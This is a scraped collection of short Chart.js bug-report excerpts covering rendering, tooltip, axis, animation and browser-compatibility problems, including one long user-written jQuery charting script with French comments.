when hovering over a tooltip the browser (safari) crashes and reloads the page automatically.
since 2.9.0 the right y-axis always includes 0
![2 9 3](
when windows width is resized, and there are 2 (or more) dynamically created charts on a page, the size of the charts grow indefinitely.
when stacked:false is set, bar chart shows as stack chart and calculation is not right
this is the current output:
![image](
when data set has positive data, stacking of zero values is as expected.
but, when data set has negative data, **stacking of zero values is not as expected**, ie
zero values are stacked on y axes zero value (not on another data set)
line width is cut in half whenever aligning with the x-axis
![screenshot 2019-11-29 at 12 33 51](
with large datasets, more than 1 more from each dataset is included in the tooltip due to `pointhitradius`.
chart.js 2.9.x
`draw` method getting `nan` values in `this._model.x` and `this._model.width` instead of correctly calculated values as it is in 2.8.0.
labels are overlapping.
only changes to the test code trigger a new test run.
using the chart.js [sample](
hiding a data of pie chart and then adding new dataset, the new dataset does not reflect the legend
see picture: ![legendbug](
animation is not rendered completely and stops at 3%.
updating chart in a quick setinterval with specific animation dosen't draw the chart
any chart appears to fail in ie11 with error "object doesn\'t support property or method \'getrootnode\'", which i think is related to nodelist processing in the browser, called from a function called selectall inside chart.js, maybe.
when minifying chart.js the minifyer argues that: ```
2>d:\\dev\\fromgit\\myproject\\myproject\\wwwroot\\lib\\chartjs\\dist\\chart.min.js(362,27,362,27): bundler & minifier error 0: strict-mode does not allow assignment to undefined variables: b
2>d:\\dev\\fromgit\\myproject\\myproject\\wwwroot\\lib\\chartjs\\dist\\chart.min.js(362,20,362,20): bundler & minifier error 0: strict-mode does not allow assignment to undefined variables: g
2>d:\\dev\\fromgit\\myproject\\myproject\\wwwroot\\lib\\chartjs\\dist\\chart.min.js(362,13,362,13): bundler & minifier error 0: strict-mode does not allow assignment to undefined variables: r
2>d:\\dev\\fromgit\\myproject\\myproject\\wwwroot\\lib\\chartjs\\dist\\chart.min.js(363,27,363,27): bundler & minifier error 0: strict-mode does not allow assignment to undefined variables: b
2>d:\\dev\\fromgit\\myproject\\myproject\\wwwroot\\lib\\chartjs\\dist\\chart.min.js(363,20,363,20): bundler & minifier error 0: strict-mode does not allow assignment to undefined variables: g
2>d:\\dev\\fromgit\\myproject\\myproject\\wwwroot\\lib\\chartjs\\dist\\chart.min.js(363,13,363,13): bundler & minifier error 0: strict-mode does not allow assignment to undefined variables: r
2>d:\\dev\\fromgit\\myproject\\myproject\\wwwroot\\lib\\chartjs\\dist\\chart.min.js(364,28,364,28): bundler & minifier error 0: strict-mode does not allow assignment to undefined variables: b
2>d:\\dev\\fromgit\\myproject\\myproject\\wwwroot\\lib\\chartjs\\dist\\chart.min.js(364,21,364,21): bundler & minifier error 0: strict-mode does not allow assignment to undefined variables: g
2>d:\\dev\\fromgit\\myproject\\myproject\\wwwroot\\lib\\chartjs\\dist\\chart.min.js(364,13,364,13): bundler & minifier error 0: strict-mode does not allow assignment to undefined variables: r
2>d:\\dev\\fromgit\\myproject\\myproject\\wwwroot\\lib\\chartjs\\dist\\chart.min.js(365,28,365,28): bundler & minifier error 0: strict-mode does not allow assignment to undefined variables: b
2>d:\\dev\\fromgit\\myproject\\myproject\\wwwroot\\lib\\chartjs\\dist\\chart.min.js(365,21,365,21): bundler & minifier error 0: strict-mode does not allow assignment to undefined variables: g
2>d:\\dev\\fromgit\\myproject\\myproject\\wwwroot\\lib\\chartjs\\dist\\chart.min.js(365,13,365,13): bundler & minifier error 0: strict-mode does not allow assignment to undefined variables: r
2>d:\\dev\\fromgit\\myproject\\myproject\\wwwroot\\lib\\chartjs\\dist\\chart.min.js(366,28,366,28): bundler & minifier error 0: strict-mode does not allow assignment to undefined variables: b
2>d:\\dev\\fromgit\\myproject\\myproject\\wwwroot\\lib\\chartjs\\dist\\chart.min.js(366,20,366,20): bundler & minifier error 0: strict-mode does not allow assignment to undefined variables: g
2>d:\\dev\\fromgit\\myproject\\myproject\\wwwroot\\lib\\chartjs\\dist\\chart.min.js(366,13,366,13): bundler & minifier error 0: strict-mode does not allow assignment to undefined variables: r
2>d:\\dev\\fromgit\\myproject\\myproject\\wwwroot\\lib\\chartjs\\dist\\chart.min.js(367,28,367,28): bundler & minifier error 0: strict-mode does not allow assignment to undefined variables: b
2>d:\\dev\\fromgit\\myproject\\myproject\\wwwroot\\lib\\chartjs\\dist\\chart.min.js(367,20,367,20): bundler & minifier error 0: strict-mode does not allow assignment to undefined variables: g
2>d:\\dev\\fromgit\\myproject\\myproject\\wwwroot\\lib\\chartjs\\dist\\chart.min.js(367,13,367,13): bundler & minifier error 0: strict-mode does not allow assignment to undefined variables: r
no chart displays instead i get the following error:
`script438: script438: object doesn't support property or method 'getrootnode'`
console error:
> script438: script438: object doesn't support property or method 'getrootnode'
using v2.9.1, ![image](
the fill starts at the edge and stops on the chart line.
the line is drawn outside `min` and `max` in 2.9.1
note that this only becomes obvious when increasing the `borderwidth`.
![2 9](
testing teh samples provided by chart.js, you get and "object doesn\'t support property or method \'getrootnode\'" error
going to [getrootnode]( definition, the method is not supported for ie and edge.
only the first point displays
the animation flickers a lot when moving the mouse while triggering new animations at the same time
by looking at the behavior it seems that the first animation restarts at the beginning each time a new animation starts, explaining the flicker.
two deprecation warnings for all horizontal bar charts ```txt
bar chart: "scales.[x/y]axes.barpercentage" is deprecated
please use "dataset.barpercentage" instead
``` and ```txt
bar chart: "scales.[x/y]axes.categorypercentage" is deprecated
please use "dataset.categorypercentage" instead
y-axis will forever be width=1.
datsetindex on line chart is always 0.
i am unable to turn off tooltips and hover
the chart cycle is running twice
all hooks and callbacks are called twice.
in "utc+12 auckland" time zone, the dst "2019-09-29t02:00:00" is not shown correctly in the chart.
points are showing up below the scale
title of the first orange datapoints tooltip is '1'
title of the first grey datapoints tooltip is '1'
when updating a chart (using `update()`) on stacked bar charts, the legend filter is reset every time.
first data of dataset 1 and last data of dataset 2 are not displayed in chart
doesn't render the whole chart or doesn't render data and/or labels
the onclick function have an empty data array as a parameter.
no chart shown on ie 11.950.........
master draws legends to mid right, not op like 2.8.0-
works if used outside iframe or iframe width/height is different than 2
(or close to 2).
when i move mouse from right to left, the active point is updated as expected
when i move mouse from left to right, the active point is not updated until mouse goes out of active point shape (8 px radius in this example)
there is no combined tooltip for overlapping points on origin of the radar for all axes
there is one tooltip per axis
if there are multiple datasets with 0 (zero) values on 2 or more axes, then it becomes very difficult to see the tooltip values of all the axes.
no point is selected
stack (group) property for line (steppedline) chart type does not work
the bars seem to be stacked by their index in data (check how tooltip highlights the bars in pic below, and how the blue ones are flying in level with green at same index) _but_ placed according to their `t` (time)
somehow the width of bars are also affected
the blue data exist on times where the green one does not (see jsbin below).
![image](
this is how the tick marks looks as of now, they get smashed
<img width="576" alt="image" src=" ">
hello i have got isssues only whit edge v16 the bordercolor of bar chart not rendering
in bar chart and labels legend.
<img src=" ">
they rendering only when i hover the data of barchart.
<img src=" "> i have this issues only with edge no problem with or chrome
this my code:
$(document).ready(function() { /** * configure le date picker mois */ $("#datepicker-container div").datepicker({ format:"m", startview:1, minviewmode:1 }); /** * configure le date picker annee */ $("#dateconteneur div").datepicker({ format:"yyyy", startview:2, minviewmode:2, maxviewmode:2 }); /** * cache l\'alert d\'erreur */ $("#alerterreur").hide();
}); /** * lorsque le formulaire mensuelle est envoyer */
$("#formmensuelle").submit(function(event) { event.preventdefault(); showgraph();
/** * affiche le bilan mensuel */
function showgraph() { /** * * redefini la facon d\'afficher le graph */ chart.defaults.groupablebar = chart.helpers.clone(chart.defaults.bar); var helpers = chart.helpers; chart.controllers.groupablebar = chart.controllers.bar.extend({ calculatebarx: function (index, datasetindex) { // position the bars based on the stack index var stackindex = this.getmeta().stackindex; return chart.controllers.bar.prototype.calculatebarx.apply(this, [index, stackindex]); }, hideotherstacks: function (datasetindex) { var meta = this.getmeta(); var stackindex = meta.stackindex; this.hiddens = []; for (var i = 0; i < datasetindex; i++) { var dsmeta = this.chart.getdatasetmeta(i); if (dsmeta.stackindex !== stackindex) { this.hiddens.push(dsmeta.hidden); dsmeta.hidden = true; } } }, unhideotherstacks: function (datasetindex) { var meta = this.getmeta(); var stackindex = meta.stackindex; for (var i = 0; i < datasetindex; i++) { var dsmeta = this.chart.getdatasetmeta(i); if (dsmeta.stackindex !== stackindex) { dsmeta.hidden = this.hiddens.unshift(); } } }, calculatebary: function (index, datasetindex) { this.hideotherstacks(datasetindex); var bary = chart.controllers.bar.prototype.calculatebary.apply(this, [index, datasetindex]); this.unhideotherstacks(datasetindex); return bary; }, calculatebarbase: function (datasetindex, index) { this.hideotherstacks(datasetindex); var barbase = chart.controllers.bar.prototype.calculatebarbase.apply(this, [datasetindex, index]); this.unhideotherstacks(datasetindex); return barbase; }, getbarcount: function () { var stacks = []; // put the stack index in the dataset meta chart.helpers.each(this.chart.data.datasets, function (dataset, datasetindex) { var meta = this.chart.getdatasetmeta(datasetindex); if (meta.bar && this.chart.isdatasetvisible(datasetindex)) { var stackindex = stacks.indexof(dataset.stack); if (stackindex === -1) { stackindex = stacks.length; stacks.push(dataset.stack); } meta.stackindex = stackindex; } }, this); this.getmeta().stacks = stacks; return stacks.length; }, }); $("#graphcanvas").show(); /** * r up e l\'url du site dans la vue */ var baseurl =$(\'#siteurl\').val(); /** * si on r ssie la r up er on configure l\'utl pour la requette ajax */ if(baseurl){ var urlpost=baseurl+\'index.php/monitoring/bilanmensuelle\' } var bargraph; /* * envoie une requette ajax pour r up er * le bilan mensuelle des documents */ var jqxhr= $.post(urlpost,$("#formmensuelle").serialize()) .done(function(data,textstatus,jqxhr){ /** * d ruit l\'instance du graph si elle existe d a */ if(window.value){ bargraph=window.value; bargraph.destroy(); } /** * cache l\'alert d\'erreur */ $("#alerterreur").hide(); //transforme les data en json data=json.parse(data); // console.log(data); /**le nombre de nouveau documents */ var nbnouveaudoc= []; // nbnouveaudoc.push(); /**le nombre de document en attente de statut applicabiliter */ var nbdocattentestatut=[]; /**le nombre de document avec exigence applicable aux pcs**/ var docexigenceapplicable=[]; /**nbr objectif annuel d\' aluation des docs **/ var objectifannueleval=[]; /**nbr document ou on c\'est prononcer sur la conformit **/ var docevaluerformaliser=[]; /**nbr des document reste faire vs objectif */ var resteafaire=[]; /** % evaluation r lis s */ var pourcentagedocevaluer=[]; /**pourcentage doc pourcentage de doc conformiter */ var pourcentagedocconformiter=[]; /** pourcentage doc conformiter avec action */ var pourcentagedocconformiter=[]; /** nbr conformiter avec actions*/ var conformiteraction=[]; /**nbr non document avec non conformiter aux documents */ var nonconformiter=[]; /**total plans d\'actions non sold par processus */ var totalnbplanactionprocessus=[]; /** * le nom des processus */ var labels=[]; /** * objets qui repr ente les donn s afficher sur le graphe */ var dataafficher={}; //r up e l\'anner actuel //var anneractuel=new date().getfullyear(); //label pour l\'objectif annuel var labelobjectifannuel="objectif mensuel d\' aluations des docs en "+data[0].annees; //label pour les documents qui reste a faire var labelresteafaire="reste faire en "+data[0].annees+" vs objectif"; /** * objets qui repr ente les couleurs de chaque histogramme * avec le meme nom de clef que l\'objet dataafficher */ var couleur={ "nouveaux documents":"rgba(51,0,0,1)", "documents en attente de statut d\'applicabilit ":"rgba(150,220,250,1)", "documents avec exigences applicables aux pcs":"rgba(255,255,255,0.0)", " aluations r lis s/formalis s":"rgba(255,255,255,0.0)", "% d\' aluation r lis s":"rgba(0,255,0,0.7)", "% de conformit ":"rgba(244,111,0,0.7)", "conformit avec actions":"rgba(255,255,255,0.0)", "non-conformit aux documents":"rgba(255,255,255,0.0)", "total plans d\'actions non sold ":"rgba(255,255,255,0.0)" }; couleur[labelobjectifannuel]="rgba(255,255,255,0.0)"; couleur[labelresteafaire]="rgba(255,255,255,0.0)"; //le nombre total de nouveaux document var totalnbnewdoc=0; //nb document en attente de statut d\'applicabilit var totalnbdocattentestatut=0; //le nb de document avec exigence applicable au pcs var totaldocexigenceapplicable=0; //le nb objectif annuel eval var totaldobjectifannueleval=0; //total evaluation r lis s formalis s var totalevalformaliser=0; //total evaluation qui reste a faire var totalresteafaire=0; //moyenne pourcentage evalution realiser var moyenneevalrealiser=0 //moyenne pourcentage doc conforme var moyenneconformiter=0; //nombre total de conformiter avec action var totalconformiteraction=0; //nombre total de non conformiter actions var totalnonconformiter=0; //nombre total de plan d\'actions var totalnbplanaction=0; //tableau qui va contenir la postion de la ligne var lines=[]; //le nombre de la ligne var id=0; //pourcentage objectif annuel evaluations var pourcentageobjectifannueleval=[]; //pourcentage objectif annuel conformit var pourcentageobjectifannuelconformiter=[]; /** * pour chaque bilan r up er de la bdd * !!!!! */ for (var i in data) { //on ajoute le nom de chaque pilotage en tant que label if(!data[i].nom){ labels.push(data[i].nom_pilotage); nbnouveaudoc[i]=parseint(data[i].nbnouveaudoc); nbdocattentestatut.push(parseint(data[i].nbdocattentestatut)); docexigenceapplicable.push(parseint(data[i].nbdocexigenceapplicablepcs)); objectifannueleval.push(parseint(data[i].objectifannueleval)); docevaluerformaliser.push(parseint(data[i].evaluerrealiserformaliser)); resteafaire.push(parseint(data[i].resteafaire)); pourcentagedocevaluer.push(parseint(data[i].pourcentagedocevaluer)); pourcentagedocconformiter.push(parseint(data[i].pourcentageconformiter)); conformiteraction.push(parseint(data[i].nbdocconformeactions)); nonconformiter.push(parseint(data[i].nbdocnonconforme)); totalnbplanactionprocessus.push(parseint(data[i].totalplanactionnonsolder)); } // r up e la valeur de %conformit if(data[i].nom==\'taux_doc_conforme\'){ for (let index = 0; index < docevaluerformaliser.length; index++) { pourcentageobjectifannuelconformiter.push(parseint(data[i].valeur)); } } //r up e la valeur de %eval doc if(data[i].nom==\'taux_doc_eval\'){ for (let index = 0; index < docevaluerformaliser.length; index++) { pourcentageobjectifannueleval.push(parseint(data[i].valeur)); } } } //additionne chaque valeur presente dans le tableau function calculateur(tableauvaleur,valeuraajouter) { return tableauvaleur+valeuraajouter; } totalnbnewdoc=nbnouveaudoc.reduce(calculateur); nbnouveaudoc.push(totalnbnewdoc); totalnbdocattentestatut=nbdocattentestatut.reduce(calculateur); nbdocattentestatut.push(totalnbdocattentestatut); totaldocexigenceapplicable=docexigenceapplicable.reduce(calculateur); docexigenceapplicable.push(totaldocexigenceapplicable); totaldobjectifannueleval=objectifannueleval.reduce(calculateur); objectifannueleval.push(totaldobjectifannueleval); totalevalformaliser=docevaluerformaliser.reduce(calculateur); docevaluerformaliser.push(totalevalformaliser); totalresteafaire=resteafaire.reduce(calculateur); resteafaire.push(totalresteafaire); moyenneevalrealiser=pourcentagedocevaluer.reduce(calculateur); moyenneevalrealiser=moyenneevalrealiser/pourcentagedocevaluer.length; pourcentagedocevaluer.push(moyenneevalrealiser); moyenneconformiter=pourcentagedocconformiter.reduce(calculateur); moyenneconformiter=moyenneconformiter/pourcentagedocconformiter.length; pourcentagedocconformiter.push(moyenneconformiter); totalconformiteraction=conformiteraction.reduce(calculateur); conformiteraction.push(totalconformiteraction); totalnonconformiter=nonconformiter.reduce(calculateur); nonconformiter.push(totalnonconformiter); totalnbplanaction=totalnbplanactionprocessus.reduce(calculateur); totalnbplanactionprocessus.push(totalnbplanaction); /**ajoute le label total */ if(labels.length>1){ labels.push("total"); }; /** * les donn s a afficher */ /* dataafficher={"nouveaux documents":nbnouveaudoc, "documents en attente de statut d\'applicabilit ":nbdocattentestatut, "documents avec exigences applicables aux pcs":docexigenceapplicable, " aluations r lis s/formalis s":docevaluerformaliser, "% d\' aluation r lis s":pourcentagedocevaluer, "% de conformit ":pourcentagedocconformiter, "conformit avec actions":conformiteraction, "non-conformit aux documents":nonconformiter, "total plans d\'actions non sold ":totalnbplanactionprocessus}; dataafficher[labelobjectifannuel]=objectifannueleval; dataafficher[labelresteafaire]=resteafaire;*/ /** * les donn s qui compose la stack %pourcentage alu s */ var eval={ "documents avec exigences applicables aux pcs":docexigenceapplicable, " aluations r lis s/formalis s":docevaluerformaliser, "% d\' aluation r lis s":pourcentagedocevaluer }; eval[labelobjectifannuel]=objectifannueleval; eval[labelresteafaire]=resteafaire; /** * les donn s qui compose la stack %pourcentage conformit */ var conformiter={ "% de conformit ":pourcentagedocconformiter, "conformit avec actions":conformiteraction, "non-conformit aux documents":nonconformiter, "total plans d\'actions non sold ":totalnbplanactionprocessus }; /** * nbr de nouveaux documents */ var normal={ "nouveaux documents":nbnouveaudoc }; var normale={ "documents en attente de statut d\'applicabilit ":nbdocattentestatut } /** * */ /** * tableau qui contient les donn s a afficher avec un axes x diff ent * representer par la cl */ var axes={"eval":eval, "conform":conformiter, "normal":normal, "normale":normale }; /** * objet pour afficher le %conformit et %objective annuel * sur les lignes */ var objectif={"% objectif mensuel des aluations: ":pourcentageobjectifannueleval, "% objectif annuel de conformit : ":pourcentageobjectifannuelconformiter, }; //console.log(dataafficher); /** * les labels en bas de lhistogramme */ var chartdata={ labels: labels }; /** * les options lines du graphiques * */ var option={ legend:{ labels:{ filter:function (item,bargraph) { if(item.text.includes("% d\' aluation r lis s")){ return item.text.includes("% d\' aluation r lis s"); } if(item.text.includes("% de conformit ")){ return item.text.includes("% de conformit "); } if(item.text.includes("nouveaux documents")){ return item.text.includes("nouveaux documents"); } if(item.text.includes("% objectif mensuel des aluations:")){ return item.text.includes("% objectif mensuel des aluations:"); } if(item.text.includes("% objectif annuel de conformit : ")){ return item.text.includes("% objectif annuel de conformit : "); } if(item.text.includes("documents en attente de statut d\'applicabilit ")){ return item.text.includes("documents en attente de statut d\'applicabilit "); } } } }, tooltips:{ mode: \'x\', intersect: true }/*, annotation:{ drawtime:"afterdraw", annotations:lines }*/, scales:{ xaxes:[{ //axes x pour les %evalu et % conformit stacked:true, id:\'bar-x-axis1\', type:\'category\' }/*,{ //axes x pour les %conformit stacked:false, id:\'bar-x-axis2\', display:false, type:\'category\', gridlines:{ offsetgridlines:true } },{ //axes x pour les nvx doc et en attente d\'applicabilit stacked:false, id:\'bar-x-axis3\', barpercentage:1, display:false, categorypercentage:1 }*/], yaxes:[ { stacked:false, ticks:{ beginatzero:true, }, } ] } }; /** * ajoute les donn s de chaque processus * @param {*} chart fait r ence a lobjet bargraph * @param {*} label fait reference au text lorsque on survole les donn s * @param {*} color fait r ence la couleur da la bar * @param {*} data les donn de la bar * @param stackid l\'axes x sur lequel ajouter la donn */ function adddata(chart,label,color,data,stackid) { var xaxesid="bar-x-axis1"; if(stackid=="eval"){ stackid=1; } if(stackid=="conform"){ stackid=2; } /*if(stackid=="normal"){ bar-x-axis2 }*/ if("total plans d\'actions non sold "==label){ chart.data.datasets.push({ label:"% objectif annuel de conformit : ", backgroundcolor:"rgba(255,255,255,0.1)", borderwidth:5, bordercolor:"rgba(204,0,255)", data:pourcentageobjectifannuelconformiter, stack:stackid, }); } if("% d\' aluation r lis s"==label){ chart.data.datasets.push({ label:"% objectif mensuel des aluations: ", backgroundcolor:"rgba(255,255,255,0.1)", borderwidth:5, bordercolor:"rgba(255,0,0)", data:pourcentageobjectifannueleval, stack:stackid, }); } chart.data.datasets.push({ label:label, backgroundcolor:color, data:data, stack:stackid, }); console.log(chart.data.datasets); chart.update(); } /** * r up e le canva dans lhtml */ var graphtarget=$("#graphcanvas"); /* for (var property in objectif) { addline(objectif[property],property); }*/ /** * creer le graph */ bargraph=new chart(graphtarget,{ type:\'groupablebar\', data : chartdata, options : option, }); /** * pour chaque bilan r up er de la bdd * on lajoute au graph * axes{key:dataaafficher{ * key:donn bilandata{data,data} * } * } */ for (var property in axes) { stackedid=property; // console.log( axes[property]); dataafficher=axes[property]; for (var property in dataafficher) { adddata(bargraph,property,couleur[property],dataafficher[property],stackedid); } } /** * ajoute les ligne de standard attendu * nbr de document en attente de statut * % objectif annuel d\' valuations * % de documents evalu * % de conformit * @param value la valeur de la ligne * @param nom le libell de la ligne */ function addline(value,nom) { id++; var ln ={ id:"line"+id, type:"line", mode:"horizontal", scaleid:"y-axis-0", value:value, borderwidth:2, bordercolor:"red", label:{ backgroundcolor:\'#804040\', // yadjust:value/, content:nom+value, enabled:true, position:"right" } }; lines.push(ln); } //enregistre l\'instance du graph dans une variable global window.value=bargraph; }).fail(function(){ /** * r up e l\'instance du graph dans la dans l\'objet window */ bargraph=window.value; //supprime l\'instance du graph if(bargraph){ bargraph.destroy(); } /** * cache l\'alert d\'erreur */ $("#alerterreur").show(); }); }
currently, under certain circumstances, the tick array generated by chart.js can include _very_ small numbers instead of zero, due to rounding error
for example, the tick array generated could be `[-0.00002, -0.00001, -3.4e-21, 0.000009999]`
in this case, the linear formatter will crash, because the argument it passes to `toexponential` is less than zero.
the data point to the far right gets cropped off
but the tooltip is displayed fine
<img width="1376" alt="screenshot 2019-07-29 at 18 58 55" src=" ">
the size of the default tooltip is too small, thus the text overflows.
does not seem to draw the specific date/time "2019-03-10t02:00:00"
it will draw the graph correctly if that specific date is not included into the x-values
it does not even draw the date/time on the x-axis.
using the development build, the rendering of the chart will apply a "white" area in the middle of the chart itself
![bug](
the radar chart is cutted from the top and bottom.
the tooltip colours do not match the colours of the legend entries
the icon should be grey but is coloured orange and white
![image](
if `time.parser:"x"` time data is parsed as unix timestamp in milliseconds (as `time.parser:"x"`)
while the `fontsize`-property of, for instance, the `title`-config uses `parseint` in case it receives a string, this does not work for the `fontsize`-property of the `legend.labels`-configuration key
the chart is displayed weirdly: ![image](
when starting out with a hidden dataset, the coordinates of the bars are incorrect.
on regular bar charts, the x/y (horizontal/vertical) coord is nan
on stacked bar charts, the same coord is an incorrect number, usually much lower than what it should be
this behaviour is only true on first load
if you manually toggle the dataset visibility (by clicking the legend), the coordinates are corrected
custom tooltip function do not executes if chart was updated inside `config.hover.onhover` callback.
ui elements are overlapping
![image](
only one is shown on firefox
one dataset is displayed on the additional unused axis.
additionally the 'unused' axis is displayed 'overlayed', but that's not what this bug report is about.
y-axis scales not showing
getting typeerror: undefined is not an object (evaluating 'ticks.length')
chartjs is using the default time.parser option
in the sample it is not working at all, on my page, it works only for the first chartjs created.
chart.js ignores configuration and draw different steps: 14.1, 14.5, 15.0, 15.5, 16.0, 16.1.
![image](
as soon as user scrolls the chart disappears
the issue is happening only on mobile device.
in this particular case, lines are not drawn -- only dots show on the graph.
javascript error on null "ctx" variable
the aspect ratio does not change
it sometimes happen that this error is thrown
either 't' (the context) or the result of measuretext is null
> undefined is not an object (evaluating 't.measuretext(r).width')
the tool tips is showing below the cursor
when the polar area chart is rendered in chrome as per the example page, ( the very bottom of the chart is clipped
the same problem occurs if the legend is disabled, resulting in the number labels being cut off at the top of the chart.
### paddings like
<img width="343" alt="" src=" "> ### should be
<img width="339" alt="" src=" ">
bars are not set to the minimum bar length specified in the config.
when creating a chart object with an empty dataset and then populating the dataset immediately afterward (such as from an ajax call), chartjs will encounter a javascript error
the devil of this is that the error will only occur if the speed of the dataset population is done immediately after the chart object is created
i enabled caching on my back end ajax provider and chartjs stopped working - it turns out that the slow speed of my ajax provider was masking this problem
in safari the error is: `null is not an object (evaluating 'this.getdatasetmeta(e).controller.transition')` in chrome the error is: `cannot read property 'transition' of null` * disabling animation on the chart solves this error.
* rendering the chart immediately after populating the dataset also seems to solve the error, but neither should be required.
![screenshot from 2019-04-11 15-05-07](
layout is broken in brave browser ![](
for a multi-day plot, instead of displaying dates such as "20 feb" the chart displays hours such as "1pm" although the difference of points is in the magnitude of days
weird thing is that this happens only for specific data.
i am not able to see chart and datasets config is going empty i.e
console.log(chart.config.data) {
labels : [],
datasets: []
setting `borderwidth` for bottom border has no effect
borderwidth: { top: 0, bottom: 5, right: 0, left: 0
``` is equivalent to ```
borderwidth: 0
only the *inner* endpoint of the border line moves as expected, the outer endpoint is stuck at the top.
see for yourself here:
change the value of `circumference` to better see the bug in action.
for a multi-day plot, instead of displaying dates such as "20 feb" the chart displays hours such as "1pm" although the difference of points is in the magnitude of days
weird thing is that this happens only for specific data.
the "bundle and minifier" component triggers an error about strict compilation.
no line number or source files is indicated.
the error is not triggered on 2.7.0 and an update of chartjs to 2.8.0 triggers the error.
the error is about undeclared variables "r" "g" "b" multiple times in strict mode.
the problem occured both with chart.js and chart.bundle.js
using scriptable options, the result is the legend item color is black
![error]( if, instead of using scriptable options, i'm passing the array of pattern, it works
```javascript
backgroundcolor: [ pattern.draw('square', '#ff6384'), pattern.draw('circle', '#36a2eb'), pattern.draw('diamond', '#cc65fe'), pattern.draw('triangle', '#ffce56'), pattern.draw('zigzag', '#fcc465')
i've tested also my canvas pattern (not by patternomaly) and the result is the same.
typeerror: argument 1 of window.getcomputedstyle does not implement interface element.
if the browser gets resized the labels on the x axis could get overlapped.
![chart](
gaps present in bars.
<img width="415" alt="screen shot 2019-02-26 at 2 53 45 pm" src=" "> in 2.7.1, i can fix this by setting the lineheight on the title to 1 instead of the default 1.2
this doesn't work in any higher versions.
when title is enabled, high data-points get removed (still visible in the chart-draw-animation).
line chart shows 2 lines when there should be only 1.
the issue is not present in safari or firefox.
in large canvas after some data points line between two points is not drawn.
![linechart](
but i see black screen
when resizing, it will work when resizing down (narrowing the chart), and will fail when scaling back up (adding more width to the screen).
at this moment the onclick responds on the whole canvas
alsof if you click on the legend.
with chart.js 2.3.0
the graph bar use the good color but the console is flooded with errors
with chart.js 2.7.3
the graph bar use the good color but the tooltip is black
bar chart labels are overlapping so they're not readable
maybe it should be rotated a little bit.
bars with negative values start from the zero-line, rather than below it, meaning they lack the top border.
chart.js overrides `window.addeventlistener()` with a completely different implementation with a different method signature!
when having a scatter plot with points of which the y-values are extremely close to each other, the y-axis disappears entirely and it looks as if there is no data at all.
the chart keeps scaling, getting bigger and bigger by the second
`maxtickslimit` doesn't limit the number of ticks
see
<img width="491" alt="screen shot 2018-12-16 at 3 45 10 pm" src=" ">
data segment borders appear to be rendering at the correct (default) startangle, but anglelines of the chart are about -1 degree off.
long labels are cropped by edge of canvas, labels overlap axis labels
![mobile-chart](
instead, only an empty area where the chart should be is displayed
here's what it looks like in firefox: ![firefox](
the second label is missing
0 value stacked bar overshoots long above the value it should
only when using logarithmic.
when i use `patternomaly` to generate pattern for the `backgroundcolor` and the `hoverbackgroundcolor`, the color in the tooltip remains to be black instead of using the same color.
currently this method fails, because parent anchor tag has property `host` which is localhost:3000 in my case, so this method returns localhost:3000 instead of parent element
helpers._getparentnode = function(domnode) { var parent = domnode.parentnode; if (parent && parent.host) { parent = parent.host; } return parent; };
canvas and its container grow indefinitely:
that setting is ignored.
the wrapper div does resize, but the chart does not.
first load of chart animates from 0 height to whatever is set in the canvas attributes
i poll for data every 15 seconds, the user toggles the legend, new data comes in and the legend toggles are all visible again (very annoying)
* add `pointer-events:none` to the `<canvas>` element
* the canvas does not react to hover or click events in chrome or ff
* the canvas still reacts to hover events in ie (tooltip and hover colors)
tooltip for point on y axis with category scale and custom labels shows undefined instead of value.
no animation and it looks bad
ticks are generated right for small ranges
at the begging i was choosing small time range, i see time on x-axis
further increase of time range will cause days to be shown
but if time range is about 5-6 days than i see '12 am' repeated on the x-axis.
in ms edge, the chart is not displayed and uncaught errors are thrown
the errors are not specific enough in order to understand what went wrong.
specifying a number array for `gridlines.linewidth` results in grid lines not being drawn.
currently, using the stacked bar with time axis need the datasets having the same point datatime even if some point is set to 0
datasets: [ { label: \'a\', data: [ { x: "01-01-2018", y: 12 }, { x: "02-01-2018", y: 15 }, ], }, { label: \'b\', data: [ { x: "01-01-2018", y: 0 }, { x: "02-01-2018", y: 23 }, { x: "03-01-2018", y: 34 }, { x: "04-01-2018", y: 45 }, ] } ],
the linear chart destroys the aspect ratio when the size is low, instead of using the available height it flattens the linear graph, leaving unused height that could've been used to correctly draw the chart.
currently the tooltip shows:
> first label
> [color box] dataset label: value 1
> [color box] dateset label: value 2
> [color box] dataset label: value n example from link below (hovering point of "my second dataset" in "april")
> [blue box] my second dataset: 7
> [blue box] my second dataset: 49
> [blue box] my second dataset: 22
the data displayed in the chart gets truncated, as the width of the screen is increasing
in certain screens the full content gets displayed when the chart container width is 8000px, for larger desktops, it supports all the way till 16000px
my screen resolution is (1366*768) and it supports 16000px width
when i increase the container width to 17000px, the results are getting truncated.
if i let chart.js auto scale the graph, it works just fine
however, my project involves using a date range picker which sets `time.min` and `time.max` to restrict the range of the graph, which causes half of the first and last bars to be cut off as there is no offset
auto scaling
<img width="712" alt="screen shot 2018-07-06 at 12 29 14 pm" src=" "> with `time.min` and `time.max`
<img width="719" alt="screen shot 2018-07-06 at 12 29 31 pm" src=" ">
i am using angular 6 with encapsulation mode native:
```javascript
/** * use the native encapsulation mechanism of the renderer
* * for the dom this means using [shadow dom]( and * creating a shadowroot for component's host element
*/ native = 1,
the chart doesn't display while the following stacktrace is printed in the browser console:
error typeerror: failed to execute 'getcomputedstyle' on 'window': parameter 1 is not of type 'element'
at object.helpers.getstyle (core.helpers.js:502) at object.helpers.getmaximumwidth (core.helpers.js:481) at chart.resize (core.controller.js:181) at chart.initialize (core.controller.js:146) at chart.construct (core.controller.js:127) at new chart (core.js:42)
``` the issue happens at this line:
```javascript
document.defaultview.getcomputedstyle(el, null).getpropertyvalue(property);
the debugger tells me that, at this point, `el` is a document-fragment.
linear axis stepsize leads to unexpected behaviour when its value is decimal and greater than 1
here's an example:
the line disappears on certain screens / window sizes.
left border is missing.
### first a null value in `scale.time.js`, method `determinedatalimits`, the value is parsed: ```
timestamp = parse(data[j], me);
``` for the value "00:34:12" it returns null because hh > 24
### then, the null value comes first in the same method, the timestamps values are sorted: ```
timestamps = arrayunique(timestamps).sort(sorter);
``` the previous null value is now first in `timestamps` array
### the null becomes a 0 the following line is: ```
min = math.min(min, timestamps[0]);
``` because `timestamps[0]` is null, min value is now 0 ### and finally..
now we are in `scale.time.js`, method `buildticks`
the min value is 0 and the max value is something like `1528926965000` because the `options.ticks.source` is `auto`, we call: ```
timestamps = generate(min, max, me.getlabelcapacity(min), options);
``` and we have now an array of 2548213 values! look at your ram increasing then kill your browser tab :wink:
* the bar is hidden in some window size
data is not drawn on the line plot with chart js 2.7.2
